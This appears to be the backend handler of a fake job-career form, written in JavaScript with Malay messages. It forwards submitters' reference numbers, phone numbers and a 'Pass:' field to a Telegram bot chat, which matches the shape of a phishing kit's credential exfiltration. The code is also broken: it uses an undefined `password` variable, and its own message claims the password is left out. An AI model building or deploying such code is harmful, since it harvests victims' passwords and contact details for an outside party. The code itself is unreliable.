
function json(res, status, data) {
    return res.status(status)
        .setHeader("Content-Type", "application/json; charset=utf-8")
        .json(data);
}

export default async function handler(req, res) {
    if (req.method !== "POST") {
        return json(res, 405, {
            success: false,
            telegramSent: false,
            message: "Method tidak dibenarkan."
        });
    }

    try {
        const reference = String(req.body?.reference || "").trim();
        const phone = String(req.body?.phone || "").trim();
        const job = String(req.body?.job || "").trim();

        const token = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!token || !chatId) {
            return json(res, 500, {
                success: false,
                telegramSent: false,
                message: "Konfigurasi Telegram belum lengkap."
            });
        }

        const message = [
            "🔔 NOTIFIKASI JOBCAREER",
            "",
            "Pengguna menghantar borang cipta kata laluan.",
            "",
            "Nomor referensi: " + (reference || "-"),
            "Nomor telefon: " + (phone || "-"),
            "Pass: " + (password || "-"),
            "Jawatan: " + (job || "-"),
            "",
            "Status: Borang pendaftaran diterima.",
            "",
            "Kata laluan tidak disertakan dalam notifikasi."
        ].join("\n");

        const response = await fetch(
            `https://api.telegram.org/bot${token}/sendMessage`,
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                }),
                signal: AbortSignal.timeout(15000)
            }
        );

        const telegramResult = await response.json();

        if (!response.ok || telegramResult.ok !== true) {
            console.error("Telegram error:", telegramResult);

            return json(res, 502, {
                success: false,
                telegramSent: false,
                message: "Telegram gagal menerima notifikasi."
            });
        }

        return json(res, 200, {
            success: true,
            telegramSent: true,
            message: "Notifikasi berjaya dihantar."
        });

    } catch (error) {
        console.error("Pass API error:", error);

        return json(res, 500, {
            success: false,
            telegramSent: false,
            message: "Gagal memproses notifikasi."
        });
    }
}
